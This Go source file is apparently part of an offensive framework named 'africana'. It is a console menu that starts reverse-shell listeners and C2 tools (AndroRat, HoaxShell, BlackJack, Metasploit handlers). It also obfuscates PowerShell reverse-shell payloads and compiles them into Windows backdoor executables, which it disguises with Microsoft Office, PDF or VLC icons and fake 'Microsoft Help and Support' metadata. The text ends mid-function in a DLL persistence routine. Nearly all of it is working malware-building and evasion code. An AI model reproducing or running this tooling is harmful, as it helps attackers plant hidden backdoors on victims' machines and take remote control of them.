package exploits

import (
    "os"
    "fmt"
    "log"
    "utils"
    "bufio"
    "menus"
    "banners"
    "time"
    "strings"
    "scriptures"
    "bcolors"
    "io/ioutil"
    "subprocess"
    "path/filepath"
    "encoding/base64"
)

var (
    Protocol = "tcp"
    Icon = "vlc"
    Lport = "9999"
    Hport = "3333"
    C2 = "blackjack"
    Malware  = "africana_malware"
    Lhost = LhostIp
    scanner = bufio.NewScanner(os.Stdin)
    LhostIp, _ = utils.GetDefaultIP()
    Input, Rhost, Proxy, Function, Script string
    CertDir, OutPutDir, KeyPath, CertPath, ToolsDir, RokyPath, WordList = utils.DirLocations()
)

var defaultValues = map[string]string{
    "proxies": "",
    "function": "",
    "script": "",
    "icon": "vlc",
    "lport": "9999",
    "hport": "3333",
    "c2": "blackjack",
    "protocol": "tcp",
    "build": "africana_malware",
    "lhost": LhostIp,
    "output": OutPutDir,
}

type stringMatcher struct {
    names  []string
    action func()
}

func ExploitsPentest() {
    for {
        fmt.Printf("%s%safr3%s exploits(%s%ssrc/pentest_%s.fn%s)%s > %s", bcolors.Underl, bcolors.Bold, bcolors.Endc, bcolors.Bold, bcolors.BrightRed, Function, bcolors.Endc, bcolors.BrightGreen, bcolors.Endc)
        scanner.Scan()
        Input = strings.TrimSpace(scanner.Text())
        buildParts := strings.Fields(strings.ToLower(Input))
        if len(buildParts) == 0 {
            continue
        }

        if executeCommand(Input) {
            continue
        }

        switch buildParts[0] {
        case "e", "q", "exit", "quit":
            os.Exit(0)
        case "0", "b", "back":
            return
        case "set":
            handleSetCommand(buildParts)
        case "unset", "delete":
            handleUnsetCommand(buildParts)
        case "run", "start", "launch", "exploit", "execute":
            executeFunction()
        default:
            utils.SystemShell(Input)
        }
    }
}

func executeCommand(cmd string) bool {
    commandGroups := []stringMatcher{
        // Info/Help commands
        {[]string{"? info", "h info", "help info"}, menus.HelpInfo},
        {[]string{"v", "version"}, banners.Version},
        {[]string{"s", "sleep"}, utils.Sleep},
        {[]string{"c", "clear", "clear screen", "screen clear"}, utils.ClearScreen},
        {[]string{"o", "junks", "outputs", "clear junks", "clear outputs"}, utils.ListJunks},
        {[]string{"logs", "history", "clear logs", "clear history"}, subprocess.LogHistory},

        // Run/exec commands
        {[]string{"? run", "h run", "info run", "help run", "? exec", "h exec", "info exec", "help exec", "? launch", "h launch", "info launch", "help launch", "? exploit", "h exploit", "info exploit", "help exploit", "? execute", "h execute", "info execute", "help execute"}, menus.HelpInfoRun},

        // Set commands
        {[]string{"set", "h set", "info set", "help set"}, menus.HelpInfoSet},
        {[]string{"use", "? use", "h use", "info use", "help use"}, menus.HelpInfoUse},

        // Other commands
        {[]string{"tips", "h tips", "? tips", "info tips", "help tips"}, menus.HelpInfoTips},
        {[]string{"show", "? show", "h show", "info show", "help show"}, menus.HelpInfoShow},
        {[]string{"info list", "help list", "use list", "list"}, menus.HelpInfoList},
        {[]string{"h option", "? option", "h options", "? options", "info option", "help option", "info options", "help options"}, menus.HelpInfOptions},
        {[]string{"banner"}, banners.RandomBanners},
        {[]string{"g", "t", "guide", "tutarial"}, utils.BrowseTutarilas},
        {[]string{"h", "?", "00", "help"}, menus.HelpInfoMenuZero},
        {[]string{"f", "use f", "features", "use features"}, menus.HelpInfoFeatures},

        // Setup commands
        {[]string{"info"}, menus.HelpInfoExploits},
        {[]string{"m", "menu"}, menus.MenuFour},
        {[]string{"option", "options", "show option", "show options"}, menus.ExploitsOptions},
        {[]string{"func", "funcs", "functions", "show func", "list funcs", "show funcs", "show function", "list function", "list functions", "show functions", "module", "modules", "list module", "show module", "list modules", "show modules", "show all", "list all"}, menus.ListExploitsFunctions},

        // Commands executions
        {[]string{"1", "run 1", "use 1", "exec 1", "start 1", "launch 1", "exploit 1", "execute 1", "run androrat", "use androrat", "exec androrat", "start androrat", "launch androrat", "exploit androrat", "execute androrat"}, func() { AndroRat(Lhost, Lport, Malware, ToolsDir, OutPutDir); menus.MenuFour() }},
        {[]string{"? 1", "info 1", "help 1", "androrat", "info androrat", "help androrat"}, menus.HelpInfoAndroRat},

        {[]string{"2", "run 2", "use 2", "exec 2", "start 2", "launch 2", "exploit 2", "execute 2", "run teardroid", "use teardroid", "exec teardroid", "start teardroid", "launch teardroid", "exploit teardroid", "execute teardroid"}, func() { TearDroid(Malware, ToolsDir, OutPutDir); menus.MenuFour() }},
        {[]string{"? 2", "info 2", "help 2", "teardroid", "info teardroid", "help teardroid"}, menus.HelpInfoTearDroid},

        {[]string{"3", "run 3", "use 3", "exec 3", "start 3", "launch 3", "exploit 3", "execute 3", "run blackjack", "use blackjack", "exec blackjack", "start blackjack", "launch blackjack", "exploit blackjack", "execute blackjack"}, func() { BlackJack(Lhost, Lport, Hport, Protocol, ToolsDir); menus.MenuFour() }},
        {[]string{"? 3", "info 3", "help 3", "blackjack", "info blackjack", "help blackjack"}, menus.HelpInfoBlackJack},

        {[]string{"4", "run 4", "use 4", "exec 4", "start 4", "launch 4", "exploit 4", "execute 4", "run hoaxshell", "use hoaxshell", "exec hoaxshell", "start hoaxshell", "launch hoaxshell", "exploit hoaxshell", "execute hoaxshell"}, func() { HoaxShell(Lhost, Lport, Hport, Protocol, ToolsDir); menus.MenuFour() }},
        {[]string{"? 4", "info 4", "help 4", "hoaxshell", "info hoaxshell", "help hoaxshell"}, menus.HelpInfoHoaxShell},

        {[]string{"5", "run 5", "use 5", "exec 5", "start 5", "launch 5", "exploit 5", "execute 5", "run shellz", "use shellz", "exec shellz", "start shellz", "launch shellz", "exploit shellz", "execute shellz"}, func() { Shellz(); menus.MenuFour() }},
        {[]string{"? 5", "info 5", "help 5", "shellz", "info shellz", "help shellz"}, menus.HelpInfoShellz},

        {[]string{"6", "run 6", "use 6", "exec 6", "start 6", "launch 6", "exploit 6", "execute 6", "run ghost", "use ghost", "exec ghost", "start ghost", "launch ghost", "exploit ghost", "execute ghost"}, func() { Gh0x0st(Malware, ToolsDir, Script, OutPutDir); menus.MenuFour() }},
        {[]string{"? 6", "info 6", "help 6", "ghost", "info ghost", "help ghost"}, menus.HelpInfoGhost},

        {[]string{"7", "run 7", "use 7", "exec 7", "start 7", "launch 7", "exploit 7", "execute 7", "run noisemaker", "use noisemaker", "exec noisemaker", "start noisemaker", "launch noisemaker", "exploit noisemaker", "execute noisemaker"}, func() { NoiseMakers(ToolsDir, Lport, Hport, Protocol, Script, Icon, C2); menus.MenuFour() }},
        {[]string{"? 7", "info 7", "help 7", "noisemaker", "info noisemaker", "help noisemaker"}, menus.HelpInfoNoiseMaker},

        {[]string{"8", "run 8", "use 8", "exec 8", "start 8", "launch 8", "exploit 8", "execute 8", "run codebreaker", "use codebreaker", "exec codebreaker", "start codebreaker", "launch codebreaker", "exploit codebreaker", "execute codebreaker"}, func() { CodeBreakers(ToolsDir, Lport, Hport, Protocol, Script, Icon , C2); menus.MenuFour() }},
        {[]string{"? 8", "info 8", "help 8", "codebreaker", "info codebreaker", "help codebreaker"}, menus.HelpInfoCodeBreaker},

        {[]string{"9", "run 9", "use 9", "exec 9", "start 9", "launch 9", "exploit 9", "execute 9", "run listener", "use listener", "exec listener", "start listener", "launch listener", "exploit listener", "execute listener"}, func() { ListenerLauncher(C2, Lport, Hport, Protocol); menus.MenuFour() }},
        {[]string{"? 9", "info 9", "help 9", "listener", "info listener", "help listener"}, menus.HelpInfoListener},

        {[]string{"10", "run 10", "use 10", "exec 10", "start 10", "launch 10", "exploit 10", "execute 10", "run verses", "use verses", "exec verses", "start verses", "launch verses", "exploit verses", "execute verses"}, scriptures.ScriptureNarators},
        {[]string{"? 10", "verses", "info 10", "help 10", "info verses", "help verses"}, menus.HelpInfoVerses},
    }

    cmdLower := strings.ToLower(cmd)
    for _, group := range commandGroups {
        for _, name := range group.names {
            if name == cmdLower {
                group.action()
                return true
            }
        }
    }
    return false
}

func handleSetCommand(parts []string) {
    if len(parts) < 3 {
        menus.HelpInfoSet()
        return
    }
    key, value := parts[1], parts[2]
    setValues := map[string]*string{

        "c2": &C2,
        "icon": &Icon,
        "lhost": &Lhost,
        "lport": &Lport,
        "hport": &Hport,
        "script": &Script,
        "build": &Malware,
        "func": &Function,
        "proxies": &Proxy,
        "module": &Function,
        "output": &OutPutDir,
        "function": &Function,
        "protocol": &Protocol,
    }

    if ptr, exists := setValues[key]; exists {
        *ptr = value
        fmt.Printf("%s => %s\n", strings.ToUpper(key), value)
    } else {
        menus.HelpInfoSet()
    }
}

func handleUnsetCommand(parts []string) {
    if len(parts) < 2 {
        menus.HelpInfoSet()
        return
    }
    key := parts[1]
    unsetValues := map[string]*string{

        "c2": &C2,
        "icon": &Icon,
        "lhost": &Lhost,
        "lport": &Lport,
        "hport": &Hport,
        "script": &Script,
        "build": &Malware,
        "func": &Function,
        "proxies": &Proxy,
        "module": &Function,
        "output": &OutPutDir,
        "function": &Function,
        "protocol": &Protocol,
    }

    if ptr, exists := unsetValues[key]; exists {
        *ptr = defaultValues[key] // Reset to default
        if *ptr != "" {
            fmt.Printf("%s => %s\n", strings.ToUpper(key), *ptr)
        }else{
            fmt.Printf("%s => %s\n", strings.ToUpper(key), "Null")
        }
    } else {
        menus.HelpInfoSet()
    }
}

func MalwarePenFunctions(Function string, args ...interface{}) {
    if Proxy != "" {
        fmt.Printf("PROXIES => %s\n", Proxy)
        if err := utils.SetProxy(Proxy); err != nil {
            // Error already printed by SetProxy
        }
    }

    commands := map[string]func(){
        "ncat":         func() {Ncat(Lport, Protocol)},
        "havoc":        func() {Havoc()},
        "ghost":        func() {Gh0x0st(Malware, ToolsDir, Script, OutPutDir)},
        "shellz":       func() {Shellz()},
        "seashell":     func() {SeaShell()},
        "androrat":     func() {AndroRat(Lhost, Lport, Malware, ToolsDir, OutPutDir)},
        "listener":     func() {ListenerLauncher(C2, Lport, Hport, Protocol)},
        "teardroid":    func() {TearDroid(Malware, ToolsDir, OutPutDir)},
        "blackjack":    func() {BlackJack(Lhost, Lport, Hport, Protocol, ToolsDir)},
        "hoaxshell":    func() {HoaxShell(Lhost, Lport, Hport, Protocol, ToolsDir)},
        "meterpeter":   func() {MeterPeter()},
        "powerjoker":   func() {PowerJoker(Lhost, Lport, ToolsDir)},
        "metasploit":   func() {Metasploit(Lhost, Lport, Protocol)},
        "noisemaker":   func() {NoiseMakers(ToolsDir, Lport, Hport, Protocol, Script, Icon, C2)},
        "codebreaker":  func() {CodeBreakers(ToolsDir, Lport, Hport, Protocol, Script, Icon , C2)},
    }

    if action, exists := commands[Function]; exists {
        action()
    } else {
        fmt.Printf("\n%s[!] %sFunction %s is invalid. Use %s'help' %sfor available Functions.\n", bcolors.Yellow, bcolors.Endc, Function, bcolors.Green, bcolors.Endc)
    }
}

func executeFunction() {
    if Function == "" {
        fmt.Printf("\n%s[!] %sFunction not set. Use %s'help' %sfor details.\n", bcolors.BrightRed, bcolors.Endc, bcolors.BrightGreen, bcolors.Endc)
        return
    }
    MalwarePenFunctions(Function, Lhost, Lport, Hport, Protocol, C2, Malware)
}


func Havoc() {
    subprocess.Popen(`havoc client & havoc server -d -v`)
}

func Shellz() {
    subprocess.Popen(`cd %s/exploits/windows/c2/shells/; bash shells.sh`, ToolsDir)
}

func SeaShell() {
    subprocess.Popen(`cd %s/exploits/mackos/c2/seashell/; python3 sea_shell.py`, ToolsDir)
}

func MeterPeter() {
    subprocess.Popen(`cd %s/exploits/windows/c2/meterpeter/; pwsh meterpeter.ps1`, ToolsDir)
}

func TearDroid(Malware string, ToolsDir string, OutPutDir string) {
    fmt.Printf("\nBUILD => %s.apk\nOUTPUT => %s\n\n", Malware, OutPutDir)
    subprocess.Popen(`cd %s/exploits/androids/c2/teardroid/; python3 Teardroid.py -b %s`, ToolsDir, Malware)
}

func AndroRat(Lhost string, Lport string, Malware string, ToolsDir string, OutPutDir string) {
    filePath := "/usr/bin/zipalign.bak_africana"
    if _, err := os.Stat(filePath); os.IsNotExist(err) {
        subprocess.Popen(`mv /usr/bin/zipalign /usr/bin/zipalign.bak_africana; apt-get install %s/exploits/androids/c2/androrat/zipalign_8.1.0.deb --allow-downgrades -y`, ToolsDir)
    }
    fmt.Printf("\nLHOST => %s\nLPORT => %s\nBUILD => %s.apk\nOUTPUT => %s\n\n", Lhost, Lport, Malware, OutPutDir)
    subprocess.Popen(fmt.Sprintf("cd %s/exploits/androids/c2/androrat/; python3 androrat.py --build -i %s -p %s -o %s/%s.apk", ToolsDir, Lhost, Lport, OutPutDir, Malware))
    subprocess.Popen(fmt.Sprintf("cd %s/exploits/androids/c2/androrat/; python3 androrat.py --shell -i %s -p %s", ToolsDir, Lhost, Lport))
}

func Chameleon(Malware string, ToolsDir string, Script string, OutPutDir string) {
    if Script == "" {
        fmt.Printf("\n%s[!] %s SCRIPT location not set. Use %s'help' %sfor details.\n", bcolors.BrightRed, bcolors.Endc, bcolors.BrightGreen, bcolors.Endc)
        return
    }
    fmt.Printf("\nBUILD => %s\nSCRIPT => %s\nOUTPUT => %s\n\n", Malware, Script, OutPutDir)
    subprocess.Popen(`cd %s/exploits/windows/obfuscators/chameleon/; python3 chameleon.py -f -s --verbose %s -o %s/%s`, ToolsDir, Script, OutPutDir, Malware)

}

func Gh0x0st(Malware string, ToolsDir string, Script string, OutPutDir string) {
    if Script == "" {
        fmt.Printf("\n%s[!] %s SCRIPT location not set. Use %s'help' %sfor details.\n", bcolors.BrightRed, bcolors.Endc, bcolors.BrightGreen, bcolors.Endc)
        return
    }
    fmt.Printf("\nBUILD => %s\nSCRIPT => %s\nOUTPUT => %s\n\n", Malware, Script, OutPutDir)
    subprocess.Popen(`cd %s/exploits/windows/obfuscators/Invoke-PSObfuscation/; pwsh -c "Import-Module ./Invoke-PSObfuscation.ps1; Invoke-PSObfuscation -Path %s -Aliases -Cmdlets -Comments -Pipes -PipelineVariables -ShowChanges -o %s"`, ToolsDir, Script, OutPutDir)
}

func PowerJoker(Lhost string, Lport string, ToolsDir string) {
    fmt.Printf("\nLHOST => %s\nLPORT => %s\n\n", Lhost, Lport)
    subprocess.Popen(`cd %s/exploits/windows/c2/joker/; python3 joker.py -l %s -p %s`, ToolsDir, Lhost, Lport)
}


func HoaxShell(Lhost string, Lport string, Hport string, Protocol string, ToolsDir string) {
    switch strings.ToLower(Protocol) {
    case "tcp":
        fmt.Printf("\nLHOST => %s\nLPORT => %s\nPROTOCOL => %s\n\n", Lhost, Lport, Protocol)
        subprocess.Popen("cd %s/exploits/windows/c2/hoaxshell/; python3 hoaxshell.py -s %s -p %s", ToolsDir, Lhost, Lport)
    case "https", "http":
        fmt.Printf("\nLHOST => %s\nLPORT => %s\nPROTOCOL => %s\n\n", Lhost, Lport, Protocol)
        subprocess.Popen("cd %s/exploits/windows/c2/hoaxshell/; python3 hoaxshell.py -s %s -c /root/.afr3/certs/africana-cert.pem -k /root/.afr3/certs/africana-key.pem -p %s", ToolsDir, Lhost, Lport)
        fmt.Println()
    default:
        fmt.Println(bcolors.BrightRed + "[!] " + bcolors.Endc + "Error: Invalid LISTENER type")
    }
}

func BlackJack(Lhost string, Lport string, Hport string, Protocol string, ToolsDir string) {
    switch strings.ToLower(Protocol) {
    case "tcp":
        fmt.Printf("\nLHOST => %s\nLPORT => %s\nPROTOCOL => %s\n\n", Lhost, Lport, Protocol)
        subprocess.Popen("cd %s/exploits/windows/c2/blackjack/; python3 blackjack.py -q -i -n %s\n", ToolsDir, Lport)
    case "https", "http":
        fmt.Printf("\nLHOST => %s\nLPORT => %s\nHPORT => %s\nPROTOCOL => %s\n\n", Lhost, Lport, Hport, Protocol)
        subprocess.Popen("cd %s/exploits/windows/c2/blackjack/; python3 blackjack.py -q -i -c /root/.afr3/certs/africana-cert.pem -k /root/.afr3/certs/africana-key.pem -x %s -n %s", ToolsDir, Lport, Hport)
        fmt.Println()
    default:
        fmt.Println(bcolors.BrightRed + "[!] " + bcolors.Endc + "Error: Invalid LISTENER type")
    }
}

func Ncat(Lport string, Protocol string) {
    switch strings.ToLower(Protocol) {
    case "tcp":
        fmt.Printf("\nLHOST => %s\nLPORT => %s\nPROTOCOL => %s\n\n", Lhost, Lport, Protocol)
        subprocess.Popen(`rlwrap ncat -lnvp %s`, Lport)
    case "https", "http":
         fmt.Printf("\nLHOST => %s\nLPORT => %s\nHPORT => %s\nPROTOCOL => %s\n\n", Lhost, Lport, Hport, Protocol)
         subprocess.Popen(`rlwrap ncat --ssl --ssl-key %s/africana-key.pem --ssl-cert %s/africana-cert.pem -lnvp %s`, CertDir, CertDir, Lport)
    default:
        fmt.Println(bcolors.BrightRed + "[!] " + bcolors.Endc + "Error: Invalid LISTENER type")
    }
}

func Metasploit(Lhost string, Lport string, Protocol string) {
    switch strings.ToLower(Protocol) {
    case "tcp":
        fmt.Printf("\nLHOST => %s\nLPORT => %s\nPROTOCOL => %s\n\n", Lhost, Lport, Protocol)
        subprocess.Popen(`msfconsole -x "use multi/handler;set payload windows/powershell_reverse_tcp; set LHOST %s; set LPORT %s; set ExitOnSession false; exploit -j"`, Lhost, Lport)
    case "http", "https":
        fmt.Printf("\nLHOST => %s\nLPORT => %s\nPROTOCOL => %s\n\n", Lhost, Lport, Protocol)
        subprocess.Popen(`msfconsole -x "use multi/handler;set payload windows/powershell_reverse_tcp_ssl; set LHOST %s; set LPORT %s; set ExitOnSession false; exploit -j"`, Lhost, Lport)
    default:
        fmt.Println(bcolors.BrightRed + "[!] " + bcolors.Endc + "Error: Invalid LISTENER type")
    }
}

func ShikataGanai(ToolsDir string, Lport string, Hport string, Protocol string, Script string, C2 string) {
    fmt.Printf("\nLHOST => %s\nLPORT => %s\nHPORT => %s\nICON => %s\nPROTOCOL => %s\nC2 => %s\n", Lhost, Lport, Hport, Icon, Protocol, C2)
    switch strings.ToLower(Protocol) {
    case "tcp":
        src := filepath.Join(ToolsDir, "exploits/windows/payload_templates/ncat_exploits/powershell_reverse_tcp.ps1")
        dst := filepath.Join(OutPutDir, "powershell_reverse_tcp.txt")

        if err := utils.Copy(src, dst); err != nil {
            log.Fatal("Copy failed:", err)
        } else {
            fmt.Printf("\n%s[+] %sCopy succeeded!\n", bcolors.BrightGreen, bcolors.Endc)
        }

        filesToReplacements := map[string]map[string]string{
            "/root/.afr3/output/powershell_reverse_tcp.txt": {
            `*LHOST*`: Lhost,
            `*LPORT*`: Lport,
            },
        }

        fmt.Println(); utils.Editors(filesToReplacements)
        Script := `/root/.afr3/output/powershell_reverse_tcp.txt`
        Obfuscated := `/root/.afr3/output/powershell_reverse_tcp.ps1`
        subprocess.Popen(`cd %s/exploits/windows/obfuscators/Invoke-PSObfuscation/; pwsh -c "Import-Module ./Invoke-PSObfuscation.ps1; Invoke-PSObfuscation -Path %s -Aliases -Cmdlets -Comments -Pipes -PipelineVariables -ShowChanges -o %s"`, ToolsDir, Script, Obfuscated)

        encoded, err := utils.EncodeFileToPowerShellEncodedCommand(Obfuscated)
        if err != nil {
            fmt.Fprintf(os.Stderr, "Error encoding file: %v\n", err)
            return
        }

        src1 := filepath.Join(ToolsDir, "exploits/windows/payload_templates/go_exploits/malware_complete.go")
        dst1 := filepath.Join(OutPutDir, "malware_complete.go")

        if err := utils.Copy(src1, dst1); err != nil {
            log.Fatal("Copy failed:", err)
        } else {
            fmt.Printf("\n%s[+] %sCopy succeeded!\n", bcolors.BrightGreen, bcolors.Endc)
        }

        Replacement := map[string]map[string]string{
            "/root/.afr3/output/malware_complete.go": {
            `africana`: encoded,
            },
        }

        fmt.Println(); utils.Editors(Replacement)
        fmt.Printf("\n%s[>] %sEncoding payload to base64 ...\n%spowershell -enc %s\n", bcolors.Yellow, bcolors.BrightBlue, bcolors.Endc, encoded)
        fmt.Printf("\n%s[>] %sConverting base64 payload to executable ...\n%s", bcolors.Yellow, bcolors.BrightBlue, bcolors.Endc)

        // Create spinner with custom options
        spinner := utils.New(
            utils.WithStyle("bar"),
            utils.WithEffect("typewriter"),
            utils.WithText("%s[+] %sCompiling the final backdooor ...", bcolors.Green, bcolors.Endc),
        )
        spinner.Start()
        subprocess.Popen("GOOS=windows GOARCH=amd64 go build -o /root/.afr3/output/malware_complete.exe /root/.afr3/output/malware_complete.go") 
        spinner.Stop()

    case "http", "https":
        src := filepath.Join(ToolsDir, "exploits/windows/payload_templates/ncat_exploits/powershell_reverse_http.ps1")
        dst := filepath.Join(OutPutDir, "/powershell_reverse_http.txt")

        if err := utils.Copy(src, dst); err != nil {
            log.Fatal("Copy failed:", err)
        } else {
            fmt.Printf("\n%s[+] %sCopy succeeded!\n", bcolors.BrightGreen, bcolors.Endc)
        }

        filesToReplacements := map[string]map[string]string{
            "/root/.afr3/output/powershell_reverse_http.txt": {
            `*LHOST*`: Lhost,
            `*LPORT*`: Lport,
            },
        }

        fmt.Println(); utils.Editors(filesToReplacements)
        Script := `/root/.afr3/output/powershell_reverse_http.txt`
        Obfuscated := `/root/.afr3/output/powershell_reverse_http.ps1`
        subprocess.Popen(`cd %s/exploits/windows/obfuscators/Invoke-PSObfuscation/; pwsh -c "Import-Module ./Invoke-PSObfuscation.ps1; Invoke-PSObfuscation -Path %s -Aliases -Cmdlets -Comments -Pipes -PipelineVariables -ShowChanges -o %s"`, ToolsDir, Script, Obfuscated)

        encoded, err := utils.EncodeFileToPowerShellEncodedCommand(Obfuscated)
        if err != nil {
            fmt.Fprintf(os.Stderr, "Error encoding file: %v\n", err)
            return
        }

        src1 := filepath.Join(ToolsDir, "exploits/windows/payload_templates/go_exploits/malware_complete.go")
        dst1 := filepath.Join(OutPutDir, "malware_complete.go")

        if err := utils.Copy(src1, dst1); err != nil {
            log.Fatal("Copy failed:", err)
        } else {
            fmt.Printf("\n%s[+] %sCopy succeeded!\n", bcolors.BrightGreen, bcolors.Endc)
        }

        filesToReplace := map[string]map[string]string{
            "/root/.afr3/output/malware_complete.go": {
            `africana`: encoded,
            },
        }

        fmt.Println(); utils.Editors(filesToReplace)
        fmt.Printf("\n%s[>] %sEncoding payload to base64 ...\n%spowershell -enc %s\n", bcolors.Yellow, bcolors.BrightBlue, bcolors.Endc, encoded)
        fmt.Printf("\n%s[>] %sConverting base64 payload to executable ...\n%s", bcolors.Yellow, bcolors.BrightBlue, bcolors.Endc)
        // Create spinner with custom options
        spinner := utils.New(
            utils.WithStyle("bar"),
            utils.WithEffect("typewriter"),
            utils.WithText("%s[+] %sCompiling the final backdooor ...\n", bcolors.Green, bcolors.Endc),
        )
        spinner.Start()
        subprocess.Popen("GOOS=windows GOARCH=amd64 go build -o /root/.afr3/output/malware_complete.exe /root/.afr3/output/malware_complete.go") 
        spinner.Stop()

    default:
        fmt.Println(bcolors.BrightRed + "[!] " + bcolors.Endc + "LISTENER %s not found. Try help command ...", Protocol)
    }
}

func IconChanger(Icon string) {
    fmt.Printf(bcolors.Yellow + "\n[>] " + bcolors.Endc + "Disguising backdoor with %s icon ...\n", Icon)
    switch strings.ToLower(Icon) {
    case "lync":
        subprocess.Popen(`wine /root/.afr3/africana-base/exploits/windows/payload_templates/rcedits/rcedit-x64.exe /root/.afr3/output/africana_backdoor.exe --set-file-version "10.0.21994.1" --set-product-version "10.0.21994.1" --set-icon /root/.afr3/africana-base/exploits/windows/payload_templates/icons/lync.ico --set-version-string OriginalFilename "MicrosoftHelpPane.exe" --set-version-string FileDescription "Microsoft Help and Support"`)
    case "excel":
        subprocess.Popen(`wine /root/.afr3/africana-base/exploits/windows/payload_templates/rcedits/rcedit-x64.exe /root/.afr3/output/africana_backdoor.exe --set-file-version "10.0.21994.1" --set-product-version "10.0.21994.1" --set-icon /root/.afr3/africana-base/exploits/windows/payload_templates/icons/excel.ico --set-version-string OriginalFilename "MicrosoftHelpPane.exe" --set-version-string FileDescription "Microsoft Help and Support"`)
    case "access":
        subprocess.Popen(`wine /root/.afr3/africana-base/exploits/windows/payload_templates/rcedits/rcedit-x64.exe /root/.afr3/output/africana_backdoor.exe --set-file-version "10.0.21994.1" --set-product-version "10.0.21994.1" --set-icon /root/.afr3/africana-base/exploits/windows/payload_templates/icons/access.ico --set-version-string OriginalFilename "MicrosoftHelpPane.exe" --set-version-string FileDescription "Microsoft Help and Support"`)
    case "autorun":
        subprocess.Popen(`wine /root/.afr3/africana-base/exploits/windows/payload_templates/rcedits/rcedit-x64.exe /root/.afr3/output/africana_backdoor.exe --set-file-version "10.0.21994.1" --set-product-version "10.0.21994.1" --set-icon /root/.afr3/africana-base/exploits/windows/payload_templates/icons/autorun.ico --set-version-string OriginalFilename "MicrosoftHelpPane.exe" --set-version-string FileDescription "Microsoft Help and Support"`)
    case "pdf":
        subprocess.Popen(`wine /root/.afr3/africana-base/exploits/windows/payload_templates/rcedits/rcedit-x64.exe /root/.afr3/output/africana_backdoor.exe --set-file-version "10.0.21994.1" --set-product-version "10.0.21994.1" --set-icon /root/.afr3/africana-base/exploits/windows/payload_templates/icons/pdf.ico --set-version-string OriginalFilename "MicrosoftHelpPane.exe" --set-version-string FileDescription "Microsoft Help and Support"`)
    case "project":
        subprocess.Popen(`wine /root/.afr3/africana-base/exploits/windows/payload_templates/rcedits/rcedit-x64.exe /root/.afr3/output/africana_backdoor.exe --set-file-version "10.0.21994.1" --set-product-version "10.0.21994.1" --set-icon /root/.afr3/africana-base/exploits/windows/payload_templates/icons/project.ico --set-version-string OriginalFilename "MicrosoftHelpPane.exe" --set-version-string FileDescription "Microsoft Help and Support"`)
    case "publisher":
        subprocess.Popen(`wine /root/.afr3/africana-base/exploits/windows/payload_templates/rcedits/rcedit-x64.exe /root/.afr3/output/africana_backdoor.exe --set-file-version "10.0.21994.1" --set-product-version "10.0.21994.1" --set-icon /root/.afr3/africana-base/exploits/windows/payload_templates/icons/publisher.ico --set-version-string OriginalFilename "MicrosoftHelpPane.exe" --set-version-string FileDescription "Microsoft Help and Support"`)
    case "powerpoint":
        subprocess.Popen(`wine /root/.afr3/africana-base/exploits/windows/payload_templates/rcedits/rcedit-x64.exe /root/.afr3/output/africana_backdoor.exe --set-file-version "10.0.21994.1" --set-product-version "10.0.21994.1" --set-icon /root/.afr3/africana-base/exploits/windows/payload_templates/icons/powerpoint.ico --set-version-string OriginalFilename "MicrosoftHelpPane.exe" --set-version-string FileDescription "Microsoft Help and Support"`)
    case "rat":
        subprocess.Popen(`wine /root/.afr3/africana-base/exploits/windows/payload_templates/rcedits/rcedit-x64.exe /root/.afr3/output/africana_backdoor.exe --set-file-version "10.0.21994.1" --set-product-version "10.0.21994.1" --set-icon /root/.afr3/africana-base/exploits/windows/payload_templates/icons/rat.ico --set-version-string OriginalFilename "MicrosoftHelpPane.exe" --set-version-string FileDescription "Microsoft Help and Support"`)
    case "vlc":
        subprocess.Popen(`wine /root/.afr3/africana-base/exploits/windows/payload_templates/rcedits/rcedit-x64.exe /root/.afr3/output/africana_backdoor.exe --set-file-version "10.0.21994.1" --set-product-version "10.0.21994.1" --set-icon /root/.afr3/africana-base/exploits/windows/payload_templates/icons/vlc.ico --set-version-string OriginalFilename "MicrosoftHelpPane.exe" --set-version-string FileDescription "Microsoft Help and Support"`)
    case "word":
        subprocess.Popen(`wine /root/.afr3/africana-base/exploits/windows/payload_templates/rcedits/rcedit-x64.exe /root/.afr3/output/africana_backdoor.exe --set-file-version "10.0.21994.1" --set-product-version "10.0.21994.1" --set-icon /root/.afr3/africana-base/exploits/windows/payload_templates/icons/word.ico --set-version-string OriginalFilename "MicrosoftHelpPane.exe" --set-version-string FileDescription "Microsoft Help and Support"`)
    case "visio":
        subprocess.Popen(`wine /root/.afr3/africana-base/exploits/windows/payload_templates/rcedits/rcedit-x64.exe /root/.afr3/output/africana_backdoor.exe --set-file-version "10.0.21994.1" --set-product-version "10.0.21994.1" --set-icon /root/.afr3/africana-base/exploits/windows/payload_templates/icons/visio.ico --set-version-string OriginalFilename "MicrosoftHelpPane.exe" --set-version-string FileDescription "Microsoft Help and Support"`)
    default:
        utils.SystemShell(Input)
    }
}

 //dll persistence mechanisim//
func NoiseMakers(ToolsDir string, Lport string, Hport string, Protocol string, Script string, Icon string, C2 string) {
    ShikataGanai(ToolsDir, Lport, Hport, Protocol, Script, C2)
    dllFilePath := "/root/.afr3/africana-base/exploits/windows/payload_templates/injected_dlls/Secur32.dll"
    exeFilePath := "/root/.afr3/output/malware_complete.exe"

    dllData, err := ioutil.ReadFile(dllFilePath)
    if err != nil {
        log.Fatalf(bcolors.BrightRed + "[!] " + bcolors.Endc + "Failed reading binary file: %s", err)
    }

    exeData, err := ioutil.ReadFile(exeFilePath)
    if err != nil {
        log.Fatalf(bcolors.BrightRed + "[!] " + bcolors.Endc + "Failed reading executable file: %s", err)
    }

    encodedExe := base64.StdEncoding.EncodeToString(exeData)
    encodedDll := base64.StdEncoding.EncodeToString(dllData)

    src := filepath.Join(ToolsDir, "exploits/windows/payload_templates/go_exploits/malware_runner_dll.go")
    dst := filepath.Join(OutPutDir, "malware_runner_dll.go")

    if err := utils.Copy(src, dst); err != nil {
        log.Fatal("Copy failed:", err)
    } else {
        fmt.Printf("\n%s[+] %sCopy succeeded!\n", bcolors.BrightGreen, bcolors.Endc)
    }

    filesToReplacements := map[string]map[string]string{
        "/root/.afr3/output/malware_runner_dll.go": {
        "africanas": encodedExe,
        `africanax`: encodedDll,
        },
    }
    utils.Editors(filesToReplacements)

    if err := os.Setenv("GOOS", "windows"); err != nil {
        log.Fatalf(bcolors.BrightRed + "[!] " + bcolors.Endc + "Failed to set GOOS environment variable: %s", err)
    }
    if err := os.Setenv("GOARCH", "amd64"); err != nil {
        log.Fatalf(bcolors.BrightRed + "[!] " + bcolors.Endc + "Failed to set GOARCH environment variable: %s", err)
    }

    runnerFilePath := "/root/.afr3/output/malware_runner_dll.go"
    endMalwarePath := "/root/.afr3/output/africana_backdoor.exe"

